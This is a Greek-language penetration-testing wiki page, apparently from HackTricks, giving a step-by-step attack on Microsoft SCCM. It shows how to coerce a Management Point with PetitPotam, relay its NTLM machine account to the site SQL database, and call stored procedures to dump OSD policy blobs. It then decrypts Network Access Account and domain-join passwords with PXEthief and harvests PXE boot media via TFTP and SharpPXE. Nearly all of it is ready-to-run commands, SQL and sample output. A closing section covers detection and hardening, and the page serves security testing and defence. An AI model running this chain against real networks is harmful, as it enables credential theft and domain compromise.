# SCCM Management Point NTLM Relay to SQL – Εξαγωγή Secret από OSD Policy

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Εξαναγκάζοντας ένα **System Center Configuration Manager (SCCM) Management Point (MP)** να πραγματοποιήσει authentication μέσω SMB/RPC και κάνοντας **relaying** αυτού του NTLM machine account προς τη **site database (MSSQL)**, αποκτάτε δικαιώματα `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Αυτοί οι ρόλοι σάς επιτρέπουν να καλέσετε ένα σύνολο stored procedures που εκθέτουν **Operating System Deployment (OSD)** policy blobs (Network Access Account credentials, Task-Sequence variables κ.λπ.). Τα blobs είναι hex-encoded/encrypted, αλλά μπορούν να γίνουν decode και decrypt με το **PXEthief**, αποδίδοντας plaintext secrets.

Αλυσίδα υψηλού επιπέδου:
1. Εντοπίστε το MP και το site DB ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Εκκινήστε το `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Κάντε coerce το MP χρησιμοποιώντας **PetitPotam**, PrinterBug, DFSCoerce κ.λπ.
4. Μέσω του SOCKS proxy συνδεθείτε με το `mssqlclient.py -windows-auth` ως ο relayed λογαριασμός **<DOMAIN>\\<MP-host>$**.
5. Εκτελέστε:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (ή `MP_GetPolicyBodyAfterAuthorization`)
6. Αφαιρέστε το `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Secrets όπως `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` κ.λπ. ανακτώνται χωρίς να αγγίξετε το PXE ή τους clients.<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Enumerating unauthenticated MP endpoints
Το MP ISAPI extension **GetAuth.dll** εκθέτει αρκετές παραμέτρους που δεν απαιτούν authentication (εκτός αν το site είναι PKI-only):<sup>[[1]](#references)</sup>

| Παράμετρος | Σκοπός |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Επιστρέφει το site signing cert public key + GUIDs των συσκευών *x86* / *x64* **All Unknown Computers**. |
| `MPLIST` | Παραθέτει κάθε Management-Point στο site. |
| `SITESIGNCERT` | Επιστρέφει το Primary-Site signing certificate (για την αναγνώριση του site server χωρίς LDAP). |

Αποκτήστε τα GUIDs που θα λειτουργήσουν ως **clientID** για τα επόμενα DB queries:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Κάντε relay τον λογαριασμό μηχανήματος MP στο MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Όταν ενεργοποιηθεί το coercion, θα πρέπει να δείτε κάτι σαν:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identify OSD policies via stored procedures
Συνδεθείτε μέσω του SOCKS proxy (θύρα 1080 από προεπιλογή):<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Μεταβείτε στη βάση δεδομένων **CM_<SiteCode>** (χρησιμοποιήστε τον 3-ψήφιο κωδικό τοποθεσίας, π.χ. `CM_001`).

### 3.1  Εύρεση GUID άγνωστων υπολογιστών (προαιρετικό)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Λίστα εκχωρημένων πολιτικών
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Κάθε γραμμή περιέχει τα `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Εστιάστε στις policies:
* **NAAConfig** – credentials του Network Access Account
* **TS_Sequence** – μεταβλητές του Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – Μπορεί να περιέχει λογαριασμούς run-as

### 3.3  Ανάκτηση πλήρους body
Αν έχετε ήδη τα `PolicyID` & `PolicyVersion`, μπορείτε να παραλείψετε την απαίτηση για clientID χρησιμοποιώντας:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> ΣΗΜΑΝΤΙΚΟ: Στο SSMS αυξήστε το “Maximum Characters Retrieved” (>65535), διαφορετικά το blob θα περικοπεί.

---

## Αποκωδικοποίηση & αποκρυπτογράφηση του blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Παράδειγμα ανακτημένων μυστικών:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Σχετικοί SQL ρόλοι & procedures
Μετά το relay, το login αντιστοιχίζεται στα:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Αυτοί οι ρόλοι εκθέτουν δεκάδες δικαιώματα EXEC. Τα βασικά που χρησιμοποιούνται σε αυτήν την επίθεση είναι:

| Stored Procedure | Σκοπός |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Εμφάνιση των policies που εφαρμόζονται σε ένα `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Επιστροφή του πλήρους policy body. |
| `MP_GetListOfMPsInSiteOSD` | Επιστρέφεται από το path `MPKEYINFORMATIONMEDIA`. |

Μπορείτε να επιθεωρήσετε την πλήρη λίστα με:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Συλλογή PXE boot media (SharpPXE)
* **Απάντηση PXE μέσω UDP/4011**: στείλτε ένα αίτημα PXE boot σε ένα Distribution Point που έχει ρυθμιστεί για PXE. Η απάντηση proxyDHCP αποκαλύπτει paths boot όπως `SMSBoot\\x64\\pxe\\variables.dat` (κρυπτογραφημένο config) και `SMSBoot\\x64\\pxe\\boot.bcd`, καθώς και ένα προαιρετικό κρυπτογραφημένο key blob.<sup>[[4]](#references)</sup>
* **Ανάκτηση boot artifacts μέσω TFTP**: χρησιμοποιήστε τα paths που επιστράφηκαν για να κατεβάσετε το `variables.dat` μέσω TFTP (χωρίς authentication). Το αρχείο είναι μικρό (λίγα KB) και περιέχει τις κρυπτογραφημένες media variables.
* **Αποκρυπτογράφηση ή cracking**:
- Αν η απάντηση περιλαμβάνει το decryption key, δώστε το στο **SharpPXE** για να αποκρυπτογραφήσει απευθείας το `variables.dat`.
- Αν δεν παρέχεται key (το PXE media προστατεύεται από custom password), το SharpPXE παράγει ένα **Hashcat-compatible** `$sccm$aes128$...` hash για offline cracking. Αφού ανακτηθεί το password, αποκρυπτογραφήστε το αρχείο.
* **Ανάλυση του decrypted XML**: οι plaintext variables περιέχουν SCCM deployment metadata (**Management Point URL**, **Site Code**, media GUIDs και άλλα identifiers). Το SharpPXE τα αναλύει και εκτυπώνει μια έτοιμη προς εκτέλεση εντολή **SharpSCCM**, με προσυμπληρωμένες τις παραμέτρους GUID/PFX/site για επακόλουθο abuse.
* **Απαιτήσεις**: απαιτείται μόνο network reachability προς τον PXE listener (UDP/4011) και TFTP· δεν χρειάζονται local admin privileges.

---

## 7. Detection & Hardening
1. **Παρακολούθηση MP logins** – οποιοσδήποτε MP computer account κάνει login από IP που δεν ανήκει στο host του ≈ relay.<sup>[[1]](#references)</sup>
2. Ενεργοποιήστε το **Extended Protection for Authentication (EPA)** στη site database (`PREVENT-14`).
3. Απενεργοποιήστε το μη χρησιμοποιούμενο NTLM, επιβάλετε SMB signing και περιορίστε το RPC (ίδια mitigations με αυτές που χρησιμοποιούνται ενάντια στα `PetitPotam`/`PrinterBug`).
4. Ενισχύστε την επικοινωνία MP ↔ DB με IPSec / mutual-TLS.
5. **Περιορίστε την έκθεση του PXE** – περιορίστε με firewall τα UDP/4011 και TFTP σε trusted VLANs, απαιτήστε PXE passwords και δημιουργήστε alert για TFTP downloads του `SMSBoot\\*\\pxe\\variables.dat`.<sup>[[4]](#references)</sup>

---

## Δείτε επίσης
* Βασικές αρχές NTLM relay:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## Αναφορές
- [1] [Θα ήθελα να μιλήσω με τον Manager σας: Κλοπή Secrets μέσω Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
